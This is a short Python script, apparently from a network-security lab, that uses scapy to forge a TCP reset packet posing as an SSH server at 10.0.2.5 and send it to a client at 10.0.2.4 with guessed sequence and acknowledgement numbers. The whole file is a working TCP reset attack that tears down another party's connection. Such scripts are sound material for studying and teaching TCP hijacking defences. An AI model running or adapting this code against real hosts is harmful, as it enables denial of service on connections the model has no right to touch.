from scapy.all import *

ip = IP(src="10.0.2.5", dst="10.0.2.4")
tcp = TCP(sport=22, dport=55168, flags="R", seq=3286317466, ack=2940733154)

pkt = ip / tcp
ls(pkt)
send(pkt, verbose=0)
